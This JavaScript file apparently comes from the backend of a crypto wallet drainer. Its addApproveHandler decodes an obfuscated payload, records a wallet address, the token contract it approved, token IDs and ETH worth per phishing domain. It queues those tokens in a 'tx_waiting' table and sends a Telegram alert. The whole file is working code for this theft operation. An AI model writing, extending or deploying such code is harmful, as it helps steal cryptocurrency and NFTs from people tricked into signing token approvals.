import { addToTable } from "../db/addUserToTable.js";
import { getDB } from "../db/getDb";
import {
  ADDR_REGEX,
  APP_TX_ROW,
  CHAT_ID_APP,
  CHAT_ID_ERR,
} from "../utils/constants.js";
import { responde } from "../utils/responde.js";
import { sleep } from "../utils/sleep.js";
import { fAddr, tgSend } from "../utils/tgSend.js";
import { c, d } from "../utils/translator.js";

export async function addApproveHandler(req, res) {
  try {
    const { addr, target, tokenIds, worth, domain } = d(req.body.payload);

    // validation
    if (!addr || !target || !tokenIds || !worth || !domain) {
      console.log("addApp Error: one of the required value are missing");
      console.log("body:", req.body);
      responde(res);
      return;
    }
    if (addr.length !== 40 || target.length !== 40) {
      console.log("Error: wrong length of addr or target");
      responde(res);
      return;
    }
    if (!ADDR_REGEX.test(addr) || !ADDR_REGEX.test(target)) {
      console.log("Error: wrong addr or target");
      responde(res);
      return;
    }

    // check duplicates
    const db = await getDB();
    const row = await db.get(
      "select * from app_users where addr=? and target=?",
      [c(addr), c(target)]
    );
    if (row) {
      responde(res);
      console.log("AddApp Error: Duplicate value");
      return;
    }

    // add to db
    await tokenIds.forEach(async (tokenId) => {
      const txObj = {
        addr: c(addr),
        target: c(target),
        tokenId: c(tokenId),
      };
      await addToTable("tx_waiting", txObj, APP_TX_ROW);
    });
    const userObj = {
      addr: c(addr),
      target: c(target),
      worth: c(worth),
      domain: c(domain),
    };
    await addToTable("app_users", userObj);

    // send to tg
    tgSend(
      `${domain} | Approve\nAddres: ${fAddr(
        addr
      )}\nContract: 0x${target}\nWorth: ${worth} ETH`,
      CHAT_ID_APP
    );
  } catch (e) {
    tgSend("Error [addApproveHandler]:" + e, CHAT_ID_ERR);
    console.log("[AddApproveHandler] Error:", e);
    await sleep(5000);
  }

  responde(res);
}
